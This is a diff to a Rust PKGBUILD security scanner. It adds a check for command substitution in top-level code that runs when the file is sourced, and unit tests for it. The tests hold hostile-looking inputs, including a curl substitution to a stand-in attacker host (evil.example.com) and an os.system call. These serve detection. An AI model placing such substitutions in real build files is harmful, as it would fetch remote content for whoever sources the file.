@@ -420,6 +420,69 @@ pub(crate) fn pkgbuild_dependencies(source: &str, current_arch: &str) -> Option<
     Some(out)
 }
 
+/// A `command_substitution` (`$(...)` or backtick `` `...` ``) reachable
+/// from a genuinely top-level PKGBUILD statement -- i.e. one that is
+/// *not* inside any `function_definition`'s body.
+///
+/// Why this matters, and why it's structurally different from every
+/// other check in this file: those all look for a dangerous *command*
+/// (curl|sh, sudo, eval, ...) -- this one doesn't care what the command
+/// is, it cares *when* it runs. Top-level PKGBUILD code executes the
+/// instant the file is sourced, by anything: `makepkg --printsrcinfo`,
+/// `makepkg -si`, `updpkgsums`, an AUR helper's own metadata read, even
+/// aura-emerge's own `.SRCINFO` regen -- none of which go anywhere near
+/// `build()`/`prepare()` or the bwrap sandbox that isolates those. A
+/// `pkgver()`/`build()`/etc. function body, by contrast, only runs when
+/// makepkg explicitly calls that function -- merely sourcing the file to
+/// read `pkgdesc` never executes it -- so this walks the tree skipping
+/// into any `function_definition`, deliberately not flagging the exact
+/// same construct there.
+///
+/// Caught this for real: a `pkgdesc` copy-pasted from a GitHub markdown
+/// description kept its code-span backticks (`` `bwrap` ``) - inside a
+/// double-quoted bash string those are still live command substitution,
+/// so merely running `makepkg --printsrcinfo` executed the literal
+/// command `bwrap` (no args) the moment the string was evaluated,
+/// nowhere near any `build()` step or sandbox. Nothing else in this file
+/// would have caught that: it's not curl|sh, not eval, not sudo, not any
+/// specific dangerous command name - it's *any* command substitution
+/// somewhere makepkg does not expect one, including a plain string field
+/// nobody thinks to review as "code".
+pub(crate) fn top_level_command_substitution(source: &str) -> Option<usize> {
+    let tree = parse(source)?;
+    let root = tree.root_node();
+    let mut cursor = root.walk();
+    for stmt in root.children(&mut cursor) {
+        if stmt.kind() == "function_definition" {
+            continue;
+        }
+        let mut substs = Vec::new();
+        find_descendants_skip_functions(stmt, "command_substitution", &mut substs);
+        if let Some(first) = substs.first() {
+            return Some(line_of(*first));
+        }
+    }
+    None
+}
+
+/// Same walk as `find_descendants`, but never recurses into a
+/// `function_definition`'s subtree - used by `top_level_command_substitution`
+/// so a legitimate `pkgver() { git describe ...; }` (only ever executed
+/// when makepkg explicitly calls `pkgver`, not on a bare `source`) is
+/// never mistaken for top-level code.
+fn find_descendants_skip_functions<'a>(node: Node<'a>, kind: &str, out: &mut Vec<Node<'a>>) {
+    let mut cursor = node.walk();
+    for child in node.children(&mut cursor) {
+        if child.kind() == "function_definition" {
+            continue;
+        }
+        if child.kind() == kind {
+            out.push(child);
+        }
+        find_descendants_skip_functions(child, kind, out);
+    }
+}
+
 #[cfg(test)]
 mod ast_tests {
     use super::*;
@@ -498,6 +561,34 @@ mod ast_tests {
         assert_eq!(python_inline_exec("python -c 'os.system(\"id\")'"), Some(1));
         assert_eq!(python_inline_exec("python3 -c 'print(1+1)'"), None);
         assert_eq!(python_inline_exec("python3 setup.py build"), None);
+    }
+
+    #[test]
+    fn top_level_command_substitution_caught_and_not_false_positive() {
+        // the real repro: backticks left over from a markdown code span,
+        // pasted straight into pkgdesc.
+        assert_eq!(
+            top_level_command_substitution(
+                "pkgdesc=\"runs untrusted build steps inside a `bwrap` sandbox.\"\npkgver=1.0.0"
+            ),
+            Some(1)
+        );
+        assert_eq!(
+            top_level_command_substitution("url=\"$(curl -s https://evil.example.com/x)\""),
+            Some(1)
+        );
+        // legitimate: command substitution *inside* a function body only
+        // runs when makepkg calls that function, not on a bare source.
+        assert_eq!(
+            top_level_command_substitution("pkgver() {\n  cd \"$srcdir\"\n  git describe --long | sed 's/^v//'\n}\n"),
+            None
+        );
+        assert_eq!(
+            top_level_command_substitution("pkgver() {\n  echo \"$(git describe)\"\n}\n"),
+            None
+        );
+        assert_eq!(top_level_command_substitution("pkgdesc=\"a perfectly normal package\""), None);
+        assert_eq!(top_level_command_substitution("# pkgdesc=\"$(curl https://x)\""), None);
     }
 
     #[test]
